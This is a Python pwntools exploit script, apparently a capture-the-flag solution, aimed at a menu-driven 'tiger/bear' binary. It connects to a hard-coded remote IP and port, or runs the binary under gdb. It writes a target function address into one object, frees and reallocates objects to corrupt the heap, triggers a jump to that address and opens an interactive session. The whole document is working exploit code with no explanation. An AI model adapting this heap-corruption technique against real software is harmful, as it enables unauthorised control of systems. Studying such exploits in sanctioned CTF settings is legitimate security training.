from pwn import *

l33tH4x0r_addr = 0x40090E

debug = False

if not debug:
	with remote('104.155.227.252', 31337) as p:
		# make tiger
		print p.recvuntil('choice:')
		p.sendline('2') # tiger
		print p.recvuntil('want:')
		p.sendline('3') # type
		print p.recvuntil('tiger:')
		p.sendline(p64(l33tH4x0r_addr))

		# make bear
		print p.recvuntil('choice:')
		p.sendline('3') # bear
		print p.recvuntil('want:')
		p.sendline('3') # type
		print p.recvuntil('name:')
		p.sendline('AAAA'*2 + '\x90'*3)

		# delete first	
		print p.recvuntil('choice:')
		p.sendline('4') # bear
		print p.recvuntil('delete?')
		p.sendline('1') # type

		# make tiger
		print p.recvuntil('choice:', timeout=1)
		p.sendline('2') # tiger
		print p.recvuntil('want:', timeout=1)
		p.sendline('3') # type
		print p.recvuntil('tiger:', timeout=1)
		p.sendline(p64(l33tH4x0r_addr))

		# pwnMe
		print p.recvuntil('choice:')
		p.sendline('4919')

		p.interactive()
else:
	p = process(['gdb', '-q', '/home/nscd/tu_ctf/woo2_fixed'])
	print p.recvuntil('(gdb)')

	# print p.sendline('watch *0x603030')
	print p.sendline('b *0x400CEF')
	# print p.sendline('b *0x400CD9')
	print p.recvuntil('(gdb)', timeout=1)
	p.sendline('r')
	
	# make tiger
	print p.recvuntil('choice:', timeout=1)
	p.sendline('2') # tiger
	print p.recvuntil('want:', timeout=1)
	p.sendline('3') # type
	print p.recvuntil('tiger:', timeout=1)
	p.sendline(p64(l33tH4x0r_addr))

	# make bear
	print p.recvuntil('choice:', timeout=1)
	p.sendline('3') # bear
	print p.recvuntil('want:', timeout=1)
	p.sendline('3') # type
	print p.recvuntil('name:')
	p.sendline('AAAA'*2 + '\x90'*3)

	# delete first	
	print p.recvuntil('choice:')
	p.sendline('4') # bear
	print p.recvuntil('delete?')
	p.sendline('1') # type

	# make tiger
	print p.recvuntil('choice:', timeout=1)
	p.sendline('2') # tiger
	print p.recvuntil('want:', timeout=1)
	p.sendline('3') # type
	print p.recvuntil('tiger:', timeout=1)
	p.sendline(p64(l33tH4x0r_addr))

	# pwnMe
	print p.recvuntil('choice:')
	p.sendline('4919')

	print p.recvuntil('(gdb)')
	p.sendline('x/32x *0x6020e0')

	p.interactive()

	